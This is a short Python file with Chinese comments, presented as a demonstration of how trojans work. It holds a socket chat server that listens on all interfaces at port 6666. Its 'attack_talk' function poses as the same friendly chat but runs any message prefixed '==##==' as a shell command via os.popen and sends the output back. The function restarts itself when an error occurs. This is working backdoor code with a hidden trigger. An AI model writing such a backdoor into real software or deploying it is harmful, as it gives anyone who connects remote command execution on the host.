#基于socket写的演示木马原理的服务器
import socket
import os
def normal_talk():
    s = socket.socket()
    #仅限绑定的ip进行访问，绑定0.0.0.0表示所有ip地址都可以访问
    s.bind(('0.0.0.0',6666))
    s.listen()
    chanel, client = s.accept()
    while True:
        receive = chanel.recv(1024).decode() #参数为缓冲区大小，也就是单次数据的最大字节，超过了就会分为多次发送
        print(f"收到消息:{receive}")
        reply=receive.replace("吗？","!")
        chanel.send(reply.encode())
def attack_talk():
    try:
        s = socket.socket()
        s.bind(('0.0.0.0',6666))
        s.listen()
        chanel, client = s.accept()
        while True:
            receive = chanel.recv(10240).decode()
            #后台规则：==##==,命令
            #遇到以==##==开头的,开始执行
            if receive.startswith('==##=='):
                command=receive.split(',')[-1]
                reply=os.popen(command).read()
                chanel.send(f"命令{command}的运行结果：\n{reply}".encode())
            else:
                print(f"收到消息:{receive}")
                reply=receive.replace("吗？","!")
                chanel.send(reply.encode())
    except:
        s.close()
        attack_talk()
if __name__ == '__main__':
    # normal_talk()
    attack_talk()
